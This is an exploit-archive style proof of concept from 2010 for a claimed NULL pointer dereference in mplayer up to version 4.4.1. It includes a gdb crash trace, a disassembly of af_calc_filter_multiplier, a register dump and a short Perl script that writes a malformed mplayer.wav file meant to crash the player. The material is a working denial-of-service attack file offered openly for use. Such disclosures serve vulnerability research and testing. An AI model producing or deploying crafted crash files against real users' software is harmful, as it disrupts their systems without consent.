# Exploit Title: mplayer <= 4.4.1 NULL pointer dereference exploit poc 0 day
# Date: 17/03/2010
# Author: Pietro Oliva
# Software Link:
# Version: <= 4.4.1
# Tested on: ubuntu 9.10 but should work in windows too
# CVE : 
 
#Program received signal SIGSEGV, Segmentation fault.
#0x081176d8 in af_calc_filter_multiplier ()
#(gdb) disas af_calc_filter_multiplier
#Dump of assembler code for function af_calc_filter_multiplier:
#0x081176d0 <af_calc_filter_multiplier+0>:    push   %ebp
#0x081176d1 <af_calc_filter_multiplier+1>:    mov    %esp,%ebp
#0x081176d3 <af_calc_filter_multiplier+3>:    fld1  
#0x081176d5 <af_calc_filter_multiplier+5>:    mov    0x8(%ebp),%eax
#0x081176d8 <af_calc_filter_multiplier+8>:    mov    (%eax),%eax  ==> mplayer tries to dereference eax, which is a NULL pointer!!!    
#0x081176da <af_calc_filter_multiplier+10>:   lea    0x0(%esi),%esi
#0x081176e0 <af_calc_filter_multiplier+16>:   fmull  0x28(%eax)
#0x081176e3 <af_calc_filter_multiplier+19>:   mov    0x18(%eax),%eax
#0x081176e6 <af_calc_filter_multiplier+22>:   test   %eax,%eax
#0x081176e8 <af_calc_filter_multiplier+24>:   jne    0x81176e0 <af_calc_filter_multiplier+16>
#0x081176ea <af_calc_filter_multiplier+26>:   pop    %ebp
#0x081176eb <af_calc_filter_multiplier+27>:   ret   
#End of assembler dump.
 
# REGISTERS:
#eax            0x0 0   ==========> NULL
#ecx            0xfa157a57  -99255721
#edx            0x1fe0  8160
#ebx            0x8509a08   139500040
#esp            0xbfffe2e8  0xbfffe2e8
#ebp            0xbfffe2e8  0xbfffe2e8
#esi            0x7b84000   129515520
#edi            0xf8000 1015808
#eip            0x81176d8   0x81176d8 <af_calc_filter_multiplier+8>
#eflags         0x10216 [ PF AF IF RF ]
#cs             0x73    115
#ss             0x7b    123
#ds             0x7b    123
#es             0x7b    123
#fs             0x0 0
#gs             0x33    51
 
 
 
#!/usr/bin/perl
 
print "[+] mplayer <= 4.4.1 NULL pointer dereference exploit poc 0 day by Pietro Oliva\n";
print "[+] pietroliva[at]gmail[dot]com  http://olivapietro.altervista.org\n";
print "[+] creating crafted file mplayer.wav\n";
$buffer="\x52\x49\x46\x46\x1f\x04\x00\x00\x57\x41\x56\x45\x66\x6d\x74\x20\x10\x00\x00\x00\x01\x00\x1f";
open(file,"> mplayer.wav");
print(file $buffer);
print "[+] done!\n";